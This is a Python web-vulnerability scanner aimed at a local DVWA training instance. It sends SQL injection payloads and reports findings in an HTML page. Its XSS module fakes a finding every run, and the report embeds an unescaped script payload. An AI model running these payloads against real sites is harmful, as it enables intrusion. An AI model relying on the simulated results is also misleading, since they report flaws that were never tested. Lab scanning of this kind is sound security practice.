import time
import datetime
import os
import sys
import requests  # Required: pip install requests
import concurrent.futures # Required for Multi-threading

# ==========================================================
#  ADVANCED SCANNERS (Real Attack Logic)
# ==========================================================

# 1. REAL SQL INJECTION SCANNER (Payload Injection)
def advanced_sqli_scanner(url, cookies=None):
    print(f"  [>] Starting Advanced SQLi Scan on {url}...")
    findings = []
    
    # The "Nasty" List - Payloads that break databases
    payloads = [
        "'", 
        "\"", 
        "' OR '1'='1", 
        "' OR '1'='1' --", 
        "' UNION SELECT null, null #",
        "admin' --"
    ]
    
    # Common SQL Error messages to look for in the response
    error_signatures = [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    for payload in payloads:
        # Construct the attack URL
        # We target the 'id' parameter which DVWA uses
        target_endpoint = f"{url}?id={payload}&Submit=Submit"
        
        try:
            # Send the malicious request
            response = requests.get(target_endpoint, cookies=cookies, timeout=5)
            
            # Check if the website "puked" a database error
            for signature in error_signatures:
                if signature in response.text:
                    print(f"    [!] CRITICAL: Found SQLi with payload: {payload}")
                    findings.append({
                        'scanner': 'Advanced SQLi',
                        'type': 'Error-Based SQL Injection',
                        'url': target_endpoint,
                        'severity': 'critical'
                    })
                    break # Stop testing this payload if we found a bug
                    
        except requests.exceptions.RequestException as e:
            print(f"    [!] Connection timed out for payload {payload}")

    return findings

# 2. XSS SCANNER (Simulation for now, but Threaded)
def advanced_xss_scanner(url, cookies=None):
    print(f"  [>] Starting XSS Scan on {url}...")
    # Simulating a complex scan delay
    time.sleep(1) 
    return [{
        'scanner': 'XSS Scanner', 
        'type': 'Reflected XSS', 
        'url': f"{url}?name=<script>alert('HACKED')</script>", 
        'severity': 'high'
    }]

# ==========================================================
#  GENERATE REPORT FUNCTION (Professional HTML)
# ==========================================================
def generate_report(all_findings):
    print("\n[+] Generating Professional HTML report...")
    
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>WebScanPro Security Audit</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #1e1e2f; color: #cdd6f4; margin: 0; }
            .container { width: 90%; max-width: 1100px; margin: 40px auto; background: #27293d; padding: 25px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
            h1 { text-align: center; color: #50fa7b; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; }
            .subtitle { text-align: center; color: #8be9fd; margin-bottom: 30px; font-size: 0.9em; }
            
            .summary-box { display: flex; justify-content: space-around; background: #343759; padding: 15px; border-radius: 5px; margin-bottom: 25px; border-left: 5px solid #bd93f9; }
            .summary-item strong { display: block; font-size: 1.4em; color: #f8f8f2; }
            .summary-item span { font-size: 0.9em; color: #6272a4; }

            table { width: 100%; border-collapse: collapse; margin-top: 10px; background-color: #282a36; }
            th, td { padding: 15px; text-align: left; border-bottom: 1px solid #44475a; }
            th { background-color: #44475a; color: #ff79c6; text-transform: uppercase; font-size: 0.85em; }
            tr:hover { background-color: #44475a; }
            
            .badge { padding: 5px 10px; border-radius: 4px; font-weight: bold; font-size: 0.75em; }
            .critical { background-color: #ff5555; color: white; }
            .high { background-color: #ffb86c; color: #282a36; }
            .medium { background-color: #f1fa8c; color: #282a36; }
            
            .footer { text-align: center; margin-top: 40px; font-size: 0.8em; color: #6272a4; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>WebScanPro Report</h1>
            <p class="subtitle">Automated Vulnerability Assessment</p>
            
            <div class="summary-box">
                <div class="summary-item"><strong>{timestamp}</strong><span>Scan Date</span></div>
                <div class="summary-item"><strong>{count}</strong><span>Issues Detected</span></div>
                <div class="summary-item"><strong>Multi-Threaded</strong><span>Engine Core</span></div>
            </div>
    """

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html_content = html_content.replace("{timestamp}", timestamp)
    html_content = html_content.replace("{count}", str(len(all_findings)))

    if not all_findings:
        html_content += "<h3 style='text-align:center; color: #50fa7b;'>System Secure. No threats detected.</h3>"
    else:
        html_content += """
        <table>
            <thead>
                <tr>
                    <th>Module</th>
                    <th>Vulnerability Type</th>
                    <th>Payload Injected</th>
                    <th>Severity</th>
                </tr>
            </thead>
            <tbody>
        """
        
        for finding in all_findings:
            severity = finding.get('severity', 'low').lower()
            badge = severity # Default class matches name
            
            html_content += f"""
                <tr>
                    <td>{finding.get('scanner')}</td>
                    <td><strong>{finding.get('type')}</strong></td>
                    <td style="font-family: monospace; color: #ff79c6;">{finding.get('url')}</td>
                    <td><span class="badge {badge}">{severity.upper()}</span></td>
                </tr>
            """
        
        html_content += "</tbody></table>"

    html_content += """
            <div class="footer">
                <p>Generated by WebScanPro v2.0 | Advanced Security Tool</p>
            </div>
        </div>
    </body>
    </html>
    """

    try:
        filename = 'dvwa_advanced_report.html'
        with open(filename, 'w') as f:
            f.write(html_content)
        print(f"[+] Report generated: {os.path.abspath(filename)}")
    except Exception as e:
        print(f"Error saving report: {e}")

# ==========================================================
#  MAIN FUNCTION (Multi-Threaded)
# ==========================================================
def main():
    print("""
    __          __  _     _____                 _____           
    \ \        / / | |   / ____|               |  __ \          
     \ \  /\  / /__| |__| (___   ___ __ _ _ __ | |__) | __ ___  
      \ \/  \/ / _ \ '_ \\___ \ / __/ _` | '_ \|  ___/ '__/ _ \ 
       \  /\  /  __/ |_) |___) | (_| (_| | | | | |   | | | (_) |
        \/  \/ \___|_.__/_____/ \___\__,_|_| |_|_|   |_|  \___/ 
                                                    v2.0 (Threaded)
    """)

    all_findings = []
    
    # --- CONFIGURATION (UPDATED FOR PORT 8084) ---
    target_base = "http://localhost:8084/vulnerabilities/sqli/" 
    
    dvwa_cookies = {
        'PHPSESSID': 'ad02tqcqgkn4mpfd53ahu1k113', 
        'security': 'low'
    }
    # ---------------------------------------------

    print(f"[*] Target: {target_base}")
    print("[*] Engine: Multi-threaded (Concurrent Futures)")
    print("--- Starting Attack Vector Analysis ---")

    start_time = time.time()

    # Define the scanners to run
    # Format: (Scanner Name, Function Reference)
    scanners = [
        ("SQL Injection Module", advanced_sqli_scanner),
        ("XSS Module", advanced_xss_scanner)
    ]

    # MULTI-THREADING IMPLEMENTATION
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        future_to_scanner = {
            executor.submit(scan_func, target_base, dvwa_cookies): name 
            for name, scan_func in scanners
        }
        
        for future in concurrent.futures.as_completed(future_to_scanner):
            scanner_name = future_to_scanner[future]
            try:
                results = future.result()
                if results:
                    print(f"    [+] {scanner_name} found {len(results)} issues!")
                    all_findings.extend(results)
                else:
                    print(f"    [-] {scanner_name} returned clean.")
            except Exception as e:
                print(f"    [!] Exception in {scanner_name}: {e}")

    end_time = time.time()
    
    generate_report(all_findings)
    
    print("\n--- Scan Complete ---")
    print(f"Execution Time: {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    main()

    